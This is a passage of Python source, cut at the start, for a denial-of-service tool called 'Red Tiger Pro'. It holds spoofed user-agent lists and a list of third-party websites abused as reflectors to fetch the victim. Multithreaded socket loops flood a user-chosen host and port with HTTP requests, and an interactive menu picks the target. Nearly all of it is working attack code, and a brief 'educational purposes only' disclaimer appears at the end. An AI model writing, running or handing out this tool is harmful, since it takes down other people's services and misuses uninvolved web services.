    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17")
    uagent.append("Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4")
    uagent.append("Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0")
    uagent.append("Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)")
    uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)")
    uagent.append("Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko")
    uagent.append("Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0")
    uagent.append("Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36")
    uagent.append("Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4")
    uagent.append("Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko")
    uagent.append("Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53")
    uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0")
    uagent.append("Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)")
    uagent.append("Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36")
    uagent.append("Mozilla/5.0 (X11; CrOS x86_64 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/7.1.7 Safari/537.85.16")
    uagent.append("Mozilla/5.0 (Windows NT 6.0; rv:40.0) Gecko/20100101 Firefox/40.0")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:40.0) Gecko/20100101 Firefox/40.0")
    uagent.append("Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36")
    uagent.append("Mozilla/5.0 (iPad; CPU OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4")
    uagent.append("Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36")
    uagent.append("Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0")
    uagent.append("Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53")
    uagent.append("Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.10 (KHTML, like Gecko) Version/8.0.4 Safari/600.4.10")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:40.0) Gecko/20100101 Firefox/40.0")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2")
    uagent.append("Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H321 Safari/600.1.4")
    uagent.append("Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
    uagent.append("Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4")
    uagent.append("Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53")
    uagent.append("Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko")
    uagent.append("Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like Gecko")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 6.3; ARM; Trident/7.0; Touch; rv:11.0) like Gecko")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0")
    uagent.append("Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MDDCJS; rv:11.0) like Gecko")
    uagent.append("Mozilla/5.0 (Windows NT 6.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0")
    uagent.append("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 6.2; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0")
    uagent.append("Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4")
    uagent.append("Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H321 Safari/600.1.4")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
    
    return (uagent)

def my_bots():
    global bots
    bots = []
    bots.append("http://validator.w3.org/check?uri=")
    bots.append("http://www.facebook.com/sharer/sharer.php?u=")
    bots.append("http://engadget.search.aol.com/search?q=")
    bots.append("http://www.usatoday.com/search/results?q=")
    bots.append("http://www.google.com/?q=")
    bots.append("http://www.bing.com/search?q=")
    bots.append("https://www.yandex.com/yandsearch?text=")
    bots.append("https://duckduckgo.com/?q=")
    bots.append("http://www.ask.com/web?q=")
    bots.append("http://search.aol.com/aol/search?q=")
    bots.append("https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term")
    bots.append("https://drive.google.com/viewerng/viewer?url=")
    bots.append("http://validator.w3.org/feed/check.cgi?url=")
    bots.append("http://host-tracker.com/check_page/?furl=")
    bots.append("http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=")
    bots.append("http://jigsaw.w3.org/css-validator/validator?uri=")
    bots.append("https://add.my.yahoo.com/rss?url=")
    bots.append("http://www.google.com/?q=")
    bots.append("http://www.usatoday.com/search/results?q=")
    bots.append("http://engadget.search.aol.com/search?q=")
    bots.append("https://steamcommunity.com/market/search?q=")
    bots.append("http://www.topsiteminecraft.com/site/pinterest.com/search?q='")
    bots.append("http://eu.battle.net/wow/en/search?q=")
    bots.append("https://www.google.ae/search?q=")
    bots.append("https://www.google.com.af/search?q=")
    bots.append("https://www.google.com.ag/search?q=")
    bots.append("https://www.google.com.ai/search?q=")
    bots.append("https://www.google.al/search?q=")
    bots.append("https://www.google.am/search?q=")
    bots.append("https://www.google.co.ao/search?q=")
    bots.append("https://steamcommunity.com/market/search?q=")
    bots.append("https://www.ted.com/search?q=")
    bots.append("https://play.google.com/store/search?q=")
    bots.append("https://www.qwant.com/search?q=")
    bots.append("https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=")
    bots.append("https://www.google.ad/search?q=")
    bots.append("https://www.youtube.com/")
    bots.append("https://check-host.net/")
    bots.append("https://www.bing.com/search?q=")
    bots.append("https://r.search.yahoo.com/")
    bots.append("https://www.facebook.com/")
    bots.append("https://vk.com/profile.php?redirect=")
    bots.append("https://www.usatoday.com/search/results?q=")
    bots.append("https://help.baidu.com/searchResult?keywords=")
    
    return (bots)

def extract_host_from_url(url):
    """URL-ből kinyeri a hosztnevet és portot"""
    try:
        # Tisztítás: eltávolítjuk a http:// vagy https:// előtagot ha van
        url = url.strip()
        if url.startswith("http://"):
            url = url[7:]
        elif url.startswith("https://"):
            url = url[8:]
        
        # Eltávolítjuk a / utáni részt
        if '/' in url:
            url = url.split('/')[0]
        
        # Port kinyerése ha van
        host_part = url
        port_part = 80  # alapértelmezett
        
        if ':' in url:
            parts = url.split(':')
            if len(parts) == 2:
                host_part = parts[0]
                try:
                    port_part = int(parts[1])
                except ValueError:
                    port_part = 80
        
        return host_part, port_part
        
    except Exception as e:
        print(f"\033[91mHiba az URL feldolgozásában: {e}\033[0m")
        return None, None

def bot_hammering(url):
    try:
        req = urllib.request.urlopen(
            urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
        print(f"\033[94mBot is hammering: {url}\033[0m")
    except Exception as e:
        pass

def down_it():
    try:
        packet = str(f"GET / HTTP/1.1\nHost: {host}\nUser-Agent: {random.choice(uagent)}\n\n").encode('utf-8')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((host, int(port)))
        s.send(packet)
        s.shutdown(socket.SHUT_WR)
        print(f"\033[92m{time.ctime(time.time())} Packet sent to {host}:{port}\033[0m")
        s.close()
    except socket.error as e:
        print(f"\033[91mConnection error to {host}:{port}\033[0m")
    except Exception as e:
        pass

def dos_worker():
    while True:
        down_it()
        time.sleep(0.1)

def bot_worker():
    while True:
        bot_hammering(random.choice(bots) + f"http://{host}")
        time.sleep(0.1)

def usage():
    print(Fore.RED + '''
    ███╗   ██╗███████╗████████╗ ███████╗████████╗██████╗ ██╗██╗  ██╗███████╗
    ████╗  ██║██╔════╝╚══██╔══╝ ██╔════╝╚══██╔══╝██╔══██╗██║██║ ██╔╝██╔════╝
    ██╔██╗ ██║█████╗     ██║    ███████╗   ██║   ██████╔╝██║█████╔╝ █████╗  
    ██║╚██╗██║██╔══╝     ██║    ╚════██║   ██║   ██╔══██╗██║██╔═██╗ ██╔══╝  
    ██║ ╚████║███████╗   ██║    ███████╗   ██║   ██║  ██║██║██║  ██╗███████╗
    ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝ 
                  \033[1;34;40m DDoS ATTACK TOOL \033[0;0m</> \033[0;49;92mRed Tiger Pro\033[0;0m 
    \033[0;49;95m Usage: python3 ddos2.py -s [IP] -p [PORT] -t [THREADS]
    \033[0;49;96m Or simply: python3 ddos2.py (interactive mode)
    \033[1;34;40m  -s : target server IP\033[0;0m
    \033[0;49;33m  -p : port (default 80)\033[0;0m
    \033[0;49;92m  -t : threads (default 50)\033[92m
    
    \033[0;49;96m Test Mode: python3 ddos2.py (uses localhost for testing)
    ======================================================================''')
    sys.exit()

def get_parameters():
    global host, port, thr
    
    print("\n" + "="*60)
    print("\033[1;34;40mRed Tiger Pro - Target Selection\033[0m")
    print("="*60)
    print("\033[93mPlease select input method:\033[0m")
    print("\033[92m1. Manual input (IP and Port)\033[0m")
    print("\033[92m2. Automatic from URL (website link)\033[0m")
    print("\033[91m4. Exit\033[0m")
    
    choice = input("\n\033[93mEnter your choice (1-3): \033[0m").strip()
    
    if choice == "1":
        print("\n\033[93mManual target input selected\033[0m")
        print("\033[93m" + "-"*40 + "\033[0m")
        host = input("\033[93mTarget IP address: \033[0m").strip()
        
        if not host:
            print("\033[91mError: IP address cannot be empty\033[0m")
            sys.exit(1)
        
        port_input = input("\033[93mTarget Port (default 80): \033[0m").strip()
        if port_input:
            try:
                port = int(port_input)
            except ValueError:
                print("\033[91mInvalid port number, using default 80\033[0m")
                port = 80
        else:
            port = 80
        
        threads_input = input("\033[93mThreads (default 50): \033[0m").strip()
        if threads_input:
            try:
                thr = int(threads_input)
            except ValueError:
                print("\033[91mInvalid thread number, using default 50\033[0m")
                thr = 50
        else:
            thr = 50
    
    elif choice == "2":
        print("\n\033[93mAutomatic URL input selected\033[0m")
        print("\033[93m" + "-"*40 + "\033[0m")
        print("\033[94mEnter a website URL (e.g., http://example.com or https://example.com:8080)\033[0m")
        
        url = input("\033[93mWebsite URL: \033[0m").strip()
        
        if not url:
            print("\033[91mError: URL cannot be empty\033[0m")
            sys.exit(1)
        
        # Kinyerjük a hosztot és portot az URL-ből
        extracted_host, extracted_port = extract_host_from_url(url)
        
        if extracted_host is None:
            print("\033[91mError: Could not extract host from URL\033[0m")
            sys.exit(1)
        
        host = extracted_host
        port = extracted_port
        
        print(f"\033[92mExtracted host: {host}\033[0m")
        print(f"\033[92mExtracted port: {port}\033[0m")
        
        threads_input = input("\033[93mThreads (default 50): \033[0m").strip()
        if threads_input:
            try:
                thr = int(threads_input)
            except ValueError:
                print("\033[91mInvalid thread number, using default 50\033[0m")
                thr = 50
        else:
            thr = 50
    
    
    elif choice == "4":
        print("\n\033[92mExiting...\033[0m")
        sys.exit(0)
    
    else:
        print("\033[91mInvalid choice. Using manual input as default.\033[0m")
        host = input("\033[93mTarget IP address: \033[0m").strip()
        port_input = input("\033[93mTarget Port (default 80): \033[0m").strip()
        port = int(port_input) if port_input else 80
        threads_input = input("\033[93mThreads (default 50): \033[0m").strip()
        thr = int(threads_input) if threads_input else 50
    
    return host, port, thr

def create_headers_file():
    """Create headers.txt file if it doesn't exist"""
    try:
        with open("headers.txt", "w") as f:
            f.write("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n")
            f.write("Accept-Language: en-US,en;q=0.5\n")
            f.write("Accept-Encoding: gzip, deflate\n")
            f.write("Connection: keep-alive\n")
            f.write("Cache-Control: max-age=0\n")
        print("\033[92mCreated headers.txt file\033[0m")
    except:
        print("\033[91mWarning: Could not create headers.txt\033[0m")

def test_connection(target_host, target_port):
    """Test if the target is reachable"""
    try:
        print(f"\033[94mTesting connection to {target_host}:{target_port}...\033[0m")
        test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test_socket.settimeout(5)
        test_socket.connect((target_host, target_port))
        test_socket.close()
        return True
    except socket.error as e:
        print(f"\033[93mWarning: Cannot connect to {target_host}:{target_port}\033[0m")
        print(f"\033[93mError: {e}\033[0m")
        return False
    except Exception as e:
        print(f"\033[93mUnexpected error: {e}\033[0m")
        return False

def main():
    global host, port, thr
    
    print("\033[1;34;40m" + "="*60 + "\033[0m")
    print("\033[1;34;40mRed Tiger Pro DDoS Tool - Starting...\033[0m")
    print("\033[1;34;40m" + "="*60 + "\033[0m")
    
    # Create headers file if needed
    create_headers_file()
    
    # Get parameters through interactive menu
    host, port, thr = get_parameters()
    
    print(f"\033[92mTarget: {host}:{port}\033[0m")
    print(f"\033[92mThreads: {thr}\033[0m")
    print(f"\033[92mStarting attack at {time.ctime(time.time())}\033[0m")
    
    # Test connection
    if not test_connection(host, port):
        continue_anyway = input("\033[93mContinue anyway? (y/n): \033[0m").strip().lower()
        if continue_anyway != 'y':
            print("\033[91mAttack cancelled\033[0m")
            sys.exit(0)
    
    # Initialize user agents and bots
    user_agent()
    my_bots()
    
    # Start attack threads
    threads = []
    
    print(f"\033[94mStarting {thr} attack threads...\033[0m")
    
    for i in range(thr):
        if i % 2 == 0:
            t = threading.Thread(target=dos_worker)
        else:
            t = threading.Thread(target=bot_worker)
        t.daemon = True
        t.start()
        threads.append(t)
    
    print(f"\033[92mAttack started with {thr} threads. Press Ctrl+C to stop.\033[0m")
    print("\033[93mNote: This is for educational purposes only!\033[0m")
    print("\033[93mWarning: Unauthorized use of this tool is illegal!\033[0m")
    
    try:
        # Keep main thread alive
        counter = 0
        while True:
            time.sleep(1)
            counter += 1
            # Show status every 10 seconds
            if counter % 10 == 0:
                print(f"\033[94mAttack in progress... {time.ctime(time.time())}\033[0m")
                print(f"\033[94mRunning for {counter} seconds\033[0m")
    except KeyboardInterrupt:
        print("\n\033[91mAttack stopped by user\033[0m")
        print("\033[92mCleaning up...\033[0m")
        sys.exit(0)

if __name__ == '__main__':
    main()